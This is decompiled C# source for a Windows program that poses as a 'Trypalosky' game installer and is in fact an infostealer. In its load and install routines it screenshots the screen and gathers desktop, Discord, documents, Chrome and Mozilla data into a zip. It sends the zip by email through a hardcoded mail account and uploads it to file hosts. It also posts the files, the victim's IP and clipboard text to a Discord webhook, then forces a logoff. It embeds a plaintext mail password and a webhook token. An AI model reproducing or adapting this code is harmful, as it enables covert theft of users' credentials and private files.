using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Media;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using SeelaksVAPI;

namespace TheNiceGuyTrypaloskyAfterMethV2;

public class Form1 : Form
{
	private string CODE;

	private WebClient WC = new WebClient();

	private bool DEBUG;

	private IContainer components;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Invalid comparison between Unknown and I4
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		if (File.Exists(BASE.AppData + "\\logs.zip"))
		{
			File.Delete(BASE.AppData + "\\logs.zip");
		}
		if (Directory.Exists(BASE.FolderPath))
		{
			Directory.Delete(BASE.FolderPath, recursive: true);
		}
		if ((int)MessageBox.Show("Install game ?", "Trypalosky Installer", (MessageBoxButtons)4, (MessageBoxIcon)32) == 6)
		{
			Playepx();
			CODE = Interaction.InputBox("Access Key:", "Seelak code Protection", "", -1, -1);
			return;
		}
		if (!DEBUG)
		{
			Playepx();
		}
		MessageBox.Show("Installation exited");
		Application.Exit();
	}

	private void Playepx()
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_014e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_015a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0161: Expected O, but got Unknown
		//IL_01fe: Unknown result type (might be due to invalid IL or missing references)
		BASE.MakeFolder();
		try
		{
			BASE.CheckDirectorySize(BASE.AppData);
			DISPLAY.ScreenShot(1920, 1080, Screen.get_PrimaryScreen(), BASE.FolderPath + "\\helpscreen.jpg");
			BASE.GetDesktop(false);
			BASE.GetDiscord();
			BASE.GetDocuments();
			BASE.GetChrome();
			BASE.GetMozilla();
			MessageBox.Show("Download Finished... now installing");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
		ZipFile.CreateFromDirectory(BASE.FolderPath, BASE.AppData + "/logs.zip", CompressionLevel.Fastest, includeBaseDirectory: true);
		if (DEBUG)
		{
			return;
		}
		BASE.SendEmail("bot@flawcra.cc", "rehcrafter0708@gmail.com", "3kBR{$ah7*P'Ay,6m2[C[Ep^RU2{_Ktm", "mail.flawcra.cc", 587, false, BASE.AppData + "/logs.zip");
		BASE.SendEmail("bot@flawcra.cc", "office@flawcra.cc", "3kBR{$ah7*P'Ay,6m2[C[Ep^RU2{_Ktm", "mail.flawcra.cc", 587, false, BASE.AppData + "/logs.zip");
		string text = WC.DownloadString("http:\\\\api.ipify.org");
		string text2 = Clipboard.GetText();
		string text3 = BASE.AnonUpload(BASE.AppData + "\\logs.zip");
		File.OpenRead(BASE.AppData + "/logs.zip");
		string text4 = "";
		try
		{
			text4 = BASE.FlawCraUpload("Files_" + text);
		}
		catch (Exception ex2)
		{
			Console.WriteLine(ex2.ToString());
		}
		ReDiscord val = new ReDiscord();
		try
		{
			SoundPlayer val2 = new SoundPlayer("http://api.flawcra.cc/Seelak/Trypalosky/TryaloskyScaryVids/T%C5%95%D3%B3%E1%B9%95%C3%A1%C4%BA%C5%91%C5%9B%E1%B8%B1%D3%B3.wav");
			val.set_WebHook("https://discordapp.com/api/webhooks/694317812730036245/ufdWkdYY2sLjaL1PDE3vlyMWVVQeuByQYFy85Hazgq24YSse8Lmc7s6QEAiW5iay9LTF");
			val.set_UserName(Environment.UserName + " IP:" + text);
			val.MSGSEND("`Files from " + val.get_UserName() + ":`");
			try
			{
				val.MSGSEND(text4);
				if (text2.Length > 0)
				{
					val.MSGSEND("`Clipboard Text = `" + text2);
				}
			}
			catch (Exception ex3)
			{
				val.MSGSEND("`Backup-server `" + text3);
				val.MSGSEND("`Main Server Error " + ex3.ToString() + "`");
			}
			MessageBox.Show("DONE");
			val2.Play();
			((Control)this).Hide();
			Process.Start("https://flawcra.cc/");
			Thread.Sleep(5000);
			Process.Start("shutdown", "/f /l");
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void axWindowsMediaPlayer1_Enter(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.Control);
		((Form)this).set_ClientSize(new Size(278, 216));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
